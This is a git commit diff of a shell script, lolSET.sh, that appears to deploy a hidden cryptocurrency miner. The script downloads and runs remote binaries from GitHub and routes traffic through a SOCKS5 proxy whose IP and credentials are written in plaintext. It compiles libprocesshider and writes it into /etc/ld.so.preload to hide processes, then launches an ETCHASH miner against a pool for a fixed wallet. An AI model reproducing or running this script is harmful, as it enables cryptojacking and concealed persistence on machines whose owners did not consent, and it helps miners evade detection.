43a6dc26374ac1ec7c55a3bfa4ca435713079bd1
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-04-12 03:39:28 +0700

    Update lolSET.sh

--- lolSET.sh
+++ lolSET.sh
@@ -9,11 +9,11 @@ wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.g
 tar -xvzf graphics.tar.gz
 
 cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233 
-loglevel = 1 
-socks5 = 3.15.39.186:1080 
-socks5_username = mikrotik999 
-socks5_password = Elibawnos 
+listen = :2233
+loglevel = 1
+socks5 = 147.182.230.110:1080
+socks5_username = sikilnjaran
+socks5_password = Njejekatos
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -21,7 +21,6 @@ END
 sleep .2
 
 echo " "
-
 echo " "
 
 echo "**"
@@ -29,13 +28,11 @@ echo "**"
 ./graftcp/graftcp curl ifconfig.me
 
 echo " "
-
 echo " "
 
 echo "**"
 
 echo " "
-
 echo " "
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/WxYtzaiu/WxYtzaiu/main/bezzHash
@@ -48,12 +45,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-ph add tuyulgpu
-
-wget https://github.com/angkii/MJ/raw/main/tuyulgpu
-
-wget https://raw.githubusercontent.com/WxYtzaiu/WxYtzaiu/main/ets.sh
-
-chmod +x ets.sh
-
-./ets.sh
+./graftcp/graftcp ./bezzHash --algo ETCHASH --pool etc.2miners.com:1010 --user 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.$(echo $(shuf -i 1-9999 -n 1)-sty) --ethstratum ETHPROXY
